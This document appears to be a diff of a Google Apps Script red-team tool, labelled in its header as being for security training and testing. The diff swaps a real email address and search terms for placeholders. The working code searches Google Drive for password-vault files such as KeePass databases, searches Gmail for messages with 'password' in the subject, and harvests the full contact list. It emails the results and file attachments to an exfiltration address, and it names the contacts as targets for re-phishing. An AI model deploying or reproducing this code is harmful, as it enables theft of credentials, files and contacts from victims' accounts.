@@ -1,4 +1,4 @@
-// Created by Greg Carson @ TMX Group Inc
+// Created by Greg Carson @ Feb 2017
 // ---------------------------------------
 // Play nice and use for security training
 // and testing.
@@ -21,7 +21,7 @@ function drivePassSearch() {
   // or fullText contains password or any other combination of keywords of interest such as target individuals, target servers, etcetera
   
   var files = DriveApp.searchFiles(
-     'modifiedDate > "2013-02-28" and title contains "kdbx"');
+     'modifiedDate > "2013-02-28" and title contains "SEARCHTERMHERE"');
  while (files.hasNext()) {
    var file = files.next();
    Logger.log(file.getDownloadUrl());
@@ -38,7 +38,7 @@ function drivePassSearch() {
   // Sender address is the current active user
    
   Logger.log(folder.getUrl());
-  var recipient = "greg.carson@tmx.com";//Session.getActiveUser().getEmail();
+  var recipient = "RECPIENT-EXFIL-EMAIL-ADDRESS-HERE";
   var subject = 'Google Drive Query - KDBX';
   var body = Logger.getLog();
   MailApp.sendEmail(recipient, subject, body);
@@ -52,10 +52,10 @@ function drivePassSearch() {
   // ***** IMPORTANT *****
   // Comment out these lines if you do not want to perform direct file attachment and exfil as this will send a lot of emails. 
   
-  var file = DriveApp.getFilesByName('CSC.kdbx');
+  var file = DriveApp.getFilesByName('FILENAME.EXT'); // ** UPDATE THIS SEARCH FIELD
   var fileBlob = file.next().getBlob();
   if (file.hasNext()) {
-    MailApp.sendEmail(recipient,/*Session.getActiveUser().getEmail(),*/'Google Drive search - Attached Files','Attached file matched a search term during Google Drive app script search.',{attachments: [fileBlob], name: file.next().getName()})
+    MailApp.sendEmail(recipient,'Google Drive search - Attached Files','Attached file matched a search term during Google Drive app script search.',{attachments: [fileBlob], name: file.next().getName()})
   }
   
    Logger.clear();
@@ -69,7 +69,7 @@ function drivePassSearch() {
 
 function gmailKeySearch() {
   
-  var threads = GmailApp.search('subject:password');
+  var threads = GmailApp.search('subject:password'); // *** UPDATE THIS SEARCH FIELD
   for (var h = 0; h < threads.length; h++) {
     var messages = threads[h].getMessages();
     for (var i = 0; i < messages.length; i++) {
@@ -110,7 +110,7 @@ function contactsRePhish() {
     Logger.log("Name: "+name+" Email: "+email);
   }
 
-  var recipient = "greg.carson@tmx.com";//Session.getActiveUser().getEmail();
+  var recipient = "RECPIENT-EXFIL-EMAIL-ADDRESS-HERE";
   var subject = 'Full List of Contacts';
   var body = Logger.getLog();
   MailApp.sendEmail(recipient, subject, body);
